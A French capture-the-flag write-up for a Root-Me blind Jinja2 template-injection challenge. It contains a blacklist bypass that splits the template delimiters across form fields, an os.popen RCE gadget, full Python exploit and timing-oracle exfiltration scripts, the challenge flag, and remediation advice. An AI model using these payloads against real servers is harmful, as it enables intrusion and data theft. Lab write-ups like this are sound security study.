# Write-up — Root-Me « Web Serveur » ch73 — Python : Blind Server Side Template Injection

**Cible :** `http://challenge01.root-me.org:59073/`
**Stack :** Flask / Werkzeug, Python 3, moteur de template **Jinja2**
**Catégorie :** Web - Serveur (auteur du challenge : *Podalirius*)
**Vulnérabilité :** SSTI *second-order* (double rendu Jinja2) → **RCE aveugle**, via contournement d'une blacklist par **reformation des délimiteurs aux frontières entre champs concaténés**, puis exfiltration par **oracle de timing**.

```
FLAG : j1nj4_s3rv3r_S1de_T3mpl4te_1j3ct10ns_1n_pyth0n
```

---

## 1. Résumé

Le formulaire de candidature de « Hackorp » injecte les champs utilisateur dans un **template de mail** rendu par Jinja2. Ce mail est ensuite **re-rendu une seconde fois** par la fonction `sendmail()`. Cette double évaluation transforme une simple substitution de variables en **exécution de template contrôlée par l'attaquant** (SSTI second-order).

Une fonction `sanitize()` filtre une blacklist (`{{`, `}}`, `{%`, `%}`, `import`, `eval`, `builtins`, `class`, `[`, `]`) **champ par champ**. Comme les quatre champs sont **concaténés sans séparateur** dans le template, on reconstitue les délimiteurs interdits `{{ … }}` **à cheval sur deux champs adjacents** — ce que `sanitize()` ne voit jamais.

Le résultat est une **RCE aveugle** (le rendu part dans un `sendmail()` qui ne renvoie rien). Faute de canal de sortie (`static/` en lecture seule, egress HTTP/DNS inexploitable depuis le poste), le flag est **reconstruit** via un **oracle de timing** : chaque requête répond à une question oui/non selon que la réponse est lente (`sleep`) ou rapide.

---

## 2. Reconnaissance

La page d'accueil est un formulaire POST à 4 champs (`name`, `surname`, `email`, `bday`). Deux informations décisives dès le `GET /` :

1. Le titre annonce une **SSTI *Blind*** → inutile de chercher un reflet de l'input dans la réponse : il n'y en a pas. C'est le piège classique qui bloque sur ce challenge.
2. Le footer propose le **code source** : *« Our website's framework is now open source! You can download it here »* → `/static/cms.tar.gz`. Le challenge est donc **white-box**.

```bash
curl -s http://challenge01.root-me.org:59073/static/cms.tar.gz -o cms.tar.gz
tar xzf cms.tar.gz
#   server_ch73.py
#   templates/{index.html,404.html}
#   static/{index.html,style.css,cms.tar.gz}
```

---

## 3. Analyse de la source — le double rendu

### 3.1 Le template de mail

```python
mail = """
...
 - Name: {{ hacker_name }}
 - Surname: {{ hacker_surname }}
 - Email: {{ hacker_email }}
 - Birth date: {{ hacker_bday }}
...
 - '{{ hacker_name }}{{ hacker_surname }}{{ hacker_email }}{{ hacker_bday }}.csv'
...
"""
```

> La dernière ligne (le nom du fichier CSV) **concatène les quatre champs sans aucun séparateur**. C'est le point d'injection clé.

### 3.2 Premier rendu (route `/`)

```python
register_mail = jinja2.Template(mail).render(
    hacker_name    = sanitize(request.form["name"]),
    hacker_surname = sanitize(request.form["surname"]),
    hacker_email   = sanitize(request.form["email"]),
    hacker_bday    = sanitize(request.form["bday"]),
)
sendmail("offsecteam@hackorp.com", register_mail)
```

À ce stade, nos champs sont injectés comme **valeurs de variables**. Jinja parse les délimiteurs **du template `mail`** et y substitue nos chaînes comme simple **donnée** : notre contenu **n'est pas évalué** ici.

### 3.3 Second rendu (`sendmail`) — la faille

```python
def sendmail(address, content):
    try:
        content += "\n\n{{ signature }}"
        _signature = """---\n<b>Offsec Team</b>\noffsecteam@hackorp.com"""
        content = jinja2.Template(content).render(signature=_signature)   # <-- (!)
    except Exception:
        pass
    return None
```

`content` est le mail **déjà assemblé** (contenant nos données). Il est **re-rendu comme template**. Toute syntaxe Jinja encore présente dans `content` est donc **évaluée ici**. C'est la définition d'une SSTI second-order.

C'est aussi ce qui la rend *blind* : `sendmail()` ne retourne rien, et la réponse HTTP est **toujours** `"Thank you! Your application will be reviewed within a week."`.

---

## 4. La blacklist et son contournement

```python
def sanitize(value):
    blacklist = ['{{','}}','{%','%}','import','eval','builtins','class','[',']']
    for word in blacklist:
        if word in value:
            value = value.replace(word,'')
    if any([bool(w in value) for w in blacklist]):
        value = sanitize(value)          # récursif
    return value
```

Deux propriétés importantes :

- **Récursif** → l'astuce d'insertion (`{{{{` → `{{`) ne marche pas : tout est nettoyé jusqu'à disparition.
- **Appliqué champ par champ**, *avant* la concaténation du template.

### 4.1 L'idée

Puisque `sanitize()` examine chaque champ **isolément**, un token interdit qui n'apparaît dans **aucun** champ pris séparément, mais se **reforme à la jonction** de deux champs adjacents, passe à travers. Ordre de concaténation sur la ligne CSV : `name · surname · email · bday`.

| Champ | Valeur | Rôle |
|---|---|---|
| `name` | `{` | fin → amorce `{{` |
| `surname` | `{` + `EXPR₁` | début → complète `{{`, puis 1ʳᵉ moitié de l'expression |
| `email` | `EXPR₂` + `}` | 2ᵉ moitié de l'expression, puis amorce `}}` |
| `bday` | `}` | complète `}}` |

Après le 1ᵉʳ rendu, la ligne CSV devient :

```
 - '{{ EXPR₁EXPR₂ }}.csv'
```

… soit une **expression Jinja valide** que le **2ᵉ rendu** exécute. Aucun champ pris isolément ne contient jamais `{{` ni `}}`.

> **Contrainte de longueur** (validée côté serveur) : `name ≤ 20`, `surname ≤ 49`, `email ≤ 49`, `bday ≤ 10`. L'expression utile `EXPR₁EXPR₂` dispose donc d'environ **96 caractères** (`surname[1:] + email[:-1]`).

---

## 5. Le gadget RCE sans caractère interdit

La blacklist bannit `class`, `builtins`, `import`, `eval`, `[` et `]`. On évite donc `__class__` / `__subclasses__[...]` et on utilise un gadget **en accès pointé pur**, via un global Jinja par défaut (`lipsum`, aussi : `cycler`) :

```jinja
lipsum.__globals__.os.popen('<CMD>').read()
```

- `lipsum` est un global Jinja2 standard ; `lipsum.__globals__` donne les globals du module qui exposent `os`.
- Accès **par point** uniquement (`.os`, `.popen`, `.read`) → **aucun crochet**.
- Aucun mot de la blacklist. Surcharge ≈ **38 c.**, il reste ~50 c. pour `<CMD>`.

---

## 6. Confirmation du RCE — oracle de timing

La vulnérabilité étant *blind*, on confirme l'exécution par un **effet observable** : le temps de réponse.

| Payload (`EXPR`) | Temps de réponse |
|---|---|
| `7*7` (contrôle) | ~2,1 s |
| `lipsum.__globals__.os.popen('sleep 6').read()` | **~13 s** (base + `sleep 6` + `sleep 5` de l'oracle) |

Le delta confirme sans ambiguïté l'**exécution de commandes arbitraires**.

---

## 7. Le vrai obstacle : *exécuter* ≠ *voir la sortie*

Point conceptuel central de ce challenge :

| | Définition | État |
|---|---|---|
| **Exécution** (RCE) | la commande tourne sur le serveur | ✅ prouvé par `sleep` |
| **Canal de sortie** | on **reçoit** ce que la commande produit | ❌ **inexistant par défaut** |

Un `ls` **s'exécute bel et bien**, mais sa sortie est insérée dans `content` à l'intérieur de `sendmail()`… qui fait `return None`. La sortie est **jetée**, la réponse HTTP reste constante. C'est la définition de *blind*.

- `ls` → son effet (stdout) part dans un canal **coupé** → invisible.
- `sleep` → son effet (le temps) part dans un canal qu'on **ne peut pas couper** → mesurable.

Tout le travail restant consiste donc à **se fabriquer un canal de sortie**.

---

## 8. Choix du canal

Cartographie via l'oracle booléen (`<cond> && sleep 5` → réponse longue = vrai) :

| Condition | Verdict |
|---|---|
| `test -w .` (cwd) | lecture seule |
| `test -w static` | lecture seule |
| `test -w /tmp` | **writable** |
| `test -d static` | existe |

- ❌ **Fichier dans le web-root** (`static/`) : impossible (lecture seule).
- ❌ **DNS / HTTP out-of-band** : pas de collecteur exploitable depuis l'environnement de résolution.
- ✅ **Oracle de timing** avec staging dans `/tmp` : **le seul canal fiable et auto-contenu**.

---

## 9. Exfiltration par oracle de timing

### 9.1 La brique : 1 requête = 1 bit

`<condition> && sleep S` : le `&&` ne lance `sleep S` **que si** la condition est vraie. **Réponse lente ⟺ vrai.** Chaque requête répond donc à une **question oui/non**.

### 9.2 Optimisation 1 — hexifier côté serveur

Lire la donnée brute pose deux problèmes : le charset imprimable (~95) est grand, et il contient des caractères dangereux (`[` `]` **blacklistés**, `"` `$` `` ` `` `\` `'` qui cassent le quoting). On **convertit la cible en hexadécimal** sur le serveur :

```sh
od -An -v -tx1 </tmp/c | tr -d " \n" > /tmp/h
```

`/tmp/h` ne contient plus que `0-9a-f` : **16 symboles sûrs**, ordonnés lexicographiquement (`'0'<…<'9'<'a'<…<'f'`). → **dichotomie à 4 questions par caractère**, sans aucun souci de quoting ni de blacklist.

### 9.3 Optimisation 2 — paralléliser + vérifier

- Chaque **position** du fichier est **indépendante** → on lit tous les nibbles en parallèle (`ThreadPoolExecutor`, 16-24 threads). Gain majeur sur le temps mur.
- Chaque nibble lu est **confirmé** par un test d'égalité (`test "$(cut -c i)" = "c"`) → annule les erreurs de **jitter réseau**.
- La **longueur** est obtenue d'abord par dichotomie numérique (`test "$(wc -c </tmp/h)" -gt N`).

### 9.4 Primitives shell & contraintes

- Guillemets **simples interdits** (ils fermeraient `popen('…')`), **doubles `"` autorisés** (hors blacklist).
- `\<` doit être **échappé** dans `test`, sinon le shell l'interprète comme une redirection.
- Budget **~96 c.** par expression → `cd` et **globs** (`*`) pour raccourcir les chemins longs.

---

## 10. Reconnaissance → localisation du flag

Toujours via l'oracle (lecture hex des sorties stagées dans `/tmp/c`) :

1. `id` → **`web-serveur-ch73`** (groupes `web-serveur-ch73`, `users`).
2. `pwd` / `env` → home **`/challenge/web-serveur/ch73`** (`SUDO_USER=root`).
3. `/challenge/.htpasswd-under-construction` → **leurre** : `-rw-r----- challenge www-data`, illisible pour nous.
4. `ls -la` du home → sous-dossier à nom aléatoire **`9f`** (nous appartenant) → `9f/35/…` (imbrication classique Root-Me).
5. `find 9f -type f` → **`9f/35/cc/c7/95/80/59/46/ac/79/10/3d/aa/flag.txt`**.

---

## 11. Dump du flag

```sh
# chemin relatif au home ; glob pour tenir sous ~96 c.
cat 9f/*/*/*/*/*/*/*/*/*/*/*/*/flag.txt > /tmp/c
# -> hexify -> lecture dichotomique parallélisée + vérifiée
```

Résultat (47 octets, **confirmé par deux lectures indépendantes concordantes**) :

```
j1nj4_s3rv3r_S1de_T3mpl4te_1j3ct10ns_1n_pyth0n
```

---

## 12. Les programmes Python

Deux fichiers. `ssti.py` est le **transport** (assemblage du payload + envoi) ; `solver.py` est le **moteur d'exfiltration** (oracle de timing, dichotomie hex, parallélisation, vérification). Les deux sont dans le même dossier ; adapter `URL`.

### 12.1 `ssti.py` — assemblage du payload & envoi

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Root-Me ch73 - Python Blind SSTI : assembleur de payload + envoi
# Mecanisme : double rendu Jinja2. On reforme {{ ... }} aux frontieres
# entre champs concatenes adjacents pour contourner sanitize() qui filtre
# chaque champ isolement.
import sys, time, requests

URL = "http://challenge01.root-me.org:59073/"
BLACKLIST = ['{{','}}','{%','%}','import','eval','builtins','class','[',']']

def build(expr):
    """Place l'expression Jinja entre {{ }} reformes aux frontieres.
    name='{' + surname='{'+E1 -> '{{'+E1 ; email=E2+'}' + bday='}' -> E2+'}}'
    => concatenation finale = {{ E1E2 }}"""
    half = (len(expr) + 1) // 2
    e1, e2 = expr[:half], expr[half:]
    fields = {
        "name":    "{",
        "surname": "{" + e1,
        "email":   e2 + "}",
        "bday":    "}",
    }
    # Verifs : limites serveur + blacklist, champ par champ, AVANT envoi
    lim = {"name": 20, "surname": 49, "email": 49, "bday": 10}
    for k, v in fields.items():
        assert len(v) <= lim[k], f"{k} trop long: {len(v)} > {lim[k]}  -> {v!r}"
        for w in BLACKLIST:
            assert w not in v, f"blacklist {w!r} present dans {k}={v!r}"
    return fields

def send(expr, show=True):
    fields = build(expr)
    data = {**fields, "button": "end"}
    t0 = time.time()
    r = requests.post(URL, data=data, timeout=60)
    dt = time.time() - t0
    if show:
        print(f"[expr {len(expr):>2}c] {dt:5.2f}s  {r.status_code}  fields={fields}")
    return dt, r

if __name__ == "__main__":
    # Rappel : fournir une EXPRESSION Jinja complete (ex. le gadget), pas une
    # commande shell brute. Pour executer une commande, l'enrober :
    #   lipsum.__globals__.os.popen('<cmd>').read()
    expr = sys.argv[1] if len(sys.argv) > 1 else "7*7"
    send(expr)
```

> **Piège fréquent** (vécu pendant le challenge) : lancer `python ssti.py "dig ... collab"` envoie `{{ dig ... }}`, une expression Jinja **invalide** → exception avalée → **rien ne s'exécute**. La commande shell doit **toujours** être enrobée dans le gadget `lipsum.__globals__.os.popen('...').read()`.

### 12.2 `solver.py` — oracle de timing, lecture hex parallélisée et vérifiée

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Root-Me ch73 - exfiltration par oracle de timing.
# Canal de sortie fabrique : 1 requete = 1 bit (reponse lente = vrai).
# Donnee hexifiee cote serveur (charset sur 0-9a-f), lue par dichotomie,
# positions lues en parallele, chaque caractere verifie (anti-jitter).
import sys, time
from concurrent.futures import ThreadPoolExecutor
from ssti import send, build          # meme dossier que ssti.py

S   = 2            # duree du sleep (s) marquant un "vrai"
THR = 3.3          # seuil dt (s) : au-dessus => vrai  (base ~2.1s, vrai ~4.1s)
HEX = "0123456789abcdef"

def fire(cmd):
    """Execute une commande MUETTE (sans sleep) : fait le travail cote serveur."""
    expr = f"lipsum.__globals__.os.popen('{cmd}').read()"
    build(expr)                        # valide longueur/blacklist -> leve si KO
    send(expr, show=False)

def ask(cond):
    """Pose une question OUI/NON via le timing. True si la reponse est lente."""
    expr = f"lipsum.__globals__.os.popen('{cond}&&sleep {S}').read()"
    build(expr)
    dt, _ = send(expr, show=False)
    return dt > THR

def get_len(hexfile="/tmp/h", hi=1200):
    """Longueur du fichier hex, par dichotomie numerique sur wc -c."""
    lo = 0
    while lo < hi:
        mid = (lo + hi + 1) // 2
        if ask(f'test "$(wc -c <{hexfile})" -gt {mid-1}'):
            lo = mid
        else:
            hi = mid - 1
    return lo

def read_nibble(i, hexfile="/tmp/h"):
    """Lit le i-eme caractere hex par dichotomie lexicographique (4 questions)."""
    lo, hi = 0, 15
    while lo < hi:
        mid = (lo + hi) // 2
        if ask(f'test "$(cut -c {i} {hexfile})" \\< "{HEX[mid+1]}"'):
            hi = mid
        else:
            lo = mid + 1
    return HEX[lo]

def read_nibble_v(i, hexfile="/tmp/h", tries=4):
    """Lit un nibble puis le CONFIRME par un test d'egalite (anti-jitter)."""
    for _ in range(tries):
        c = read_nibble(i, hexfile)
        if ask(f'test "$(cut -c {i} {hexfile})" = "{c}"'):
            return c
    return c

def read_file(stage_cmd, workers=16):
    """stage_cmd ecrit la cible dans /tmp/c ; hexifie -> /tmp/h ; lit en parallele.
    Ex. stage_cmd = 'id>/tmp/c'  ou  'cat 9f/*/.../flag.txt>/tmp/c'."""
    fire(stage_cmd)
    if not ask("test -s /tmp/c"):
        print("  [!] /tmp/c vide ou illisible"); return None
    fire('od -An -v -tx1 </tmp/c|tr -d " \\n">/tmp/h')
    n = get_len()
    print(f"  [*] {n} hex chars ({n//2} octets)")
    out = [None] * n
    with ThreadPoolExecutor(max_workers=workers) as ex:
        futs = {ex.submit(read_nibble_v, i + 1): i for i in range(n)}
        for f in list(futs):
            out[futs[f]] = f.result()
    try:
        return bytes.fromhex("".join(out))
    except ValueError:
        print("  [!] hex invalide:", "".join(out)); return None

if __name__ == "__main__":
    t0 = time.time()
    # Commande de staging fournie en argv (doit ecrire la cible dans /tmp/c).
    stage   = sys.argv[1] if len(sys.argv) > 1 else "id>/tmp/c"
    workers = int(sys.argv[2]) if len(sys.argv) > 2 else 16
    data = read_file(stage, workers=workers)
    print("=" * 50)
    print(data.decode(errors="replace") if data else "(rien)")
    print("=" * 50)
    print(f"[fini en {time.time()-t0:.0f}s]")
```

### 12.3 Utilisation

```bash
# 1. Confirmer le RCE
python ssti.py "lipsum.__globals__.os.popen('sleep 6').read()"

# 2. Reconnaissance (chaque commande ecrit sa sortie dans /tmp/c puis est lue)
python solver.py "id>/tmp/c"
python solver.py "pwd>/tmp/c"
python solver.py "ls -la>/tmp/c"
python solver.py "find 9f -type f>/tmp/c 2>/dev/null"

# 3. Dump du flag (glob pour tenir sous ~96 c.), 24 threads
python solver.py "cat 9f/*/*/*/*/*/*/*/*/*/*/*/*/flag.txt>/tmp/c" 24
```

---

## 13. Vulnérabilités identifiées

| # | Vulnérabilité | Détail |
|---|---|---|
| 1 | **SSTI second-order** (CWE-1336 / CWE-94) | Le mail assemblé est re-rendu par `jinja2.Template(content).render()` → exécution de template contrôlée par l'attaquant. |
| 2 | **Filtrage par liste noire inefficace** | `sanitize()` agit champ par champ ; la concaténation adjacente permet de reformer les tokens interdits à la jonction. |
| 3 | **Exécution de code à distance** (CWE-78) | Gadget `lipsum.__globals__.os.popen()` → commandes shell arbitraires. |

---

## 14. Remédiation

1. **Ne jamais re-rendre un contenu déjà rendu.** Supprimer le second `jinja2.Template(content).render(...)` de `sendmail()` ; composer la signature **avant** l'unique rendu, ou la concaténer comme texte **après**.
2. **Entrée utilisateur = donnée, jamais template.** Passer les valeurs uniquement en **contexte de variables**, de préférence via `jinja2.sandbox.SandboxedEnvironment` + `autoescape`.
3. **Validation par liste blanche** stricte et par champ (`bday` : regex de date ; `email` : format email ; `name`/`surname` : charset alphabétique). Une blacklist fragmentaire est systématiquement contournable (ici : reformation inter-champs).
4. **Moindre privilège** : l'application web n'a aucune raison de lancer des processus shell ; isoler (conteneur restreint, `seccomp`), couper l'egress inutile.

---

## 15. Conclusion

Ce challenge illustre trois idées souvent sous-estimées :

- Une **SSTI *blind*** n'a pas besoin de reflet visible : le point d'injection peut être un **second rendu** interne (ici un mail), détecté uniquement par **analyse du code** et confirmé par **effet de bord** (timing).
- Un **filtrage par liste noire fragment par fragment** est contournable dès que les fragments sont **recombinés** en aval : les délimiteurs `{{ … }}` et le gadget RCE se reforment **aux frontières entre champs**.
- **RCE ≠ visibilité.** On avait l'exécution sans canal de sortie ; l'essentiel du travail a consisté à **fabriquer un canal** (le temps) et à **reconstruire** la donnée de l'extérieur, un bit à la fois — hexification pour un charset sûr, dichotomie pour la vitesse, parallélisation pour le temps mur, vérification pour la fiabilité.

*Challenge résolu — flag `j1nj4_s3rv3r_S1de_T3mpl4te_1j3ct10ns_1n_pyth0n`.*
